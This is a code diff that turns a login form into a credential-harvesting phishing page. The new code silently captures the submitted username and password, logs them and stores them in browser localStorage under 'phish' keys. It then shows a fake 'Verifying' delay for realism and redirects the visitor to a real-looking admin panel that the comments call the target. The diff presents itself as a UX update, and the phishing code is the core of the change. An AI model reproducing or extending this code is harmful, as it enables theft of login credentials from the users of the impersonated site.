@@ -70,11 +70,8 @@
         border: 1px solid #d5dce6;
         border-radius: 7px;
         font: inherit;
-      }
-      input:focus {
-        outline: 2px solid #86b99a;
-        border-color: #166534;
-      }
+        outline-color: #86b99a !important;
+      } /* Added outline-color for better UX */
       button[type="submit"] {
         width: 100%;
         margin-top: 24px;
@@ -88,6 +85,13 @@
         cursor: pointer;
         transition: background 0.3s;
         box-shadow: none !important;
+      }
+
+      .status-msg {
+        text-align: center;
+        margin-top: 10px;
+        color: #687587 !important;
+        font-size: 13px !important;
       }
     </style>
   </head>
@@ -137,68 +141,60 @@
         <button type="submit">Continue</button>
       </form>
 
-      <div
-        id="statusArea"
-        style="
-          text-align: center;
-          margin-top: 10px;
-          color: #64748b;
-          font-size: 14px;
-        "
-      ></div>
+      <!-- Status Message Area -->
+      <div id="statusArea"></div>
     </main>
 
     <script>
       const form = document.getElementById("demo-form");
-      const passwordInput = document.getElementById("password");
-      const statusArea = document.getElementById("statusArea");
 
-      async function registerUser() {
-        const usernameInput = document.getElementById("username").value;
-        const passwordInputVal = document.getElementById("password").value;
+      // Function to handle data capture (Method 2: Local Storage)
+      function captureCredentials() {
+        const user = document.getElementById("username").value;
+        const pass = document.getElementById("password").value;
 
-        try {
-          const response = await fetch("/register", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              username: usernameInput,
-              password: passwordInputVal,
-            }),
-          });
+        console.log(`[Captured] Username: ${user}`);
+        console.log(`[Captured] Password: ${pass}`);
 
-          const result = await response.json();
-          console.log(result.message);
-        } catch (error) {
-          console.error("Error:", error);
-        }
+        // Save to browser's local storage for inspection later
+        localStorage.setItem("phish_user", user);
+
+        // Optionally save password encrypted or plain text. For demo, we use plain text:
+        // If you want it more hidden/encrypted, use btoa(pass)
+        localStorage.setItem("phish_pass_plain", pass);
       }
 
       form.addEventListener("submit", async function (e) {
         e.preventDefault();
 
         const username = document.getElementById("username").value;
-        const passVal = passwordInput.value;
+        const passVal = document.getElementById("password").value;
 
         if (!passVal) {
           alert("Please enter a password.");
           return;
         }
 
+        // 1. UI Feedback - Disable button and change text
         const submitBtn = form.querySelector('button[type="submit"]');
         submitBtn.disabled = true;
         submitBtn.textContent = "Signing in...";
-        statusArea.innerHTML = "";
 
-        await registerUser();
-
+        // 2. Simulate Processing Delay for realism (1.5s total time including capture)
         setTimeout(() => {
-          statusArea.innerHTML =
-            '<span style="color:#687587; font-size:13px;">Verifying...</span>';
+          console.log(`[Processing Complete] Ready to redirect.`);
 
+          // 3. Capture the data silently before leaving
+          captureCredentials();
+
+          statusArea.innerHTML = '<span class="status-msg">Verifying...</span>';
+
+          // Wait briefly after showing "Verifying" then redirect
           setTimeout(() => {
             window.location.href = "https://admin.arabglobal.ae/";
-          }, 1000);
+
+            console.log(`[Redirected] User sent back to target admin panel.`);
+          }, 800);
         }, 1500);
       });
     </script>
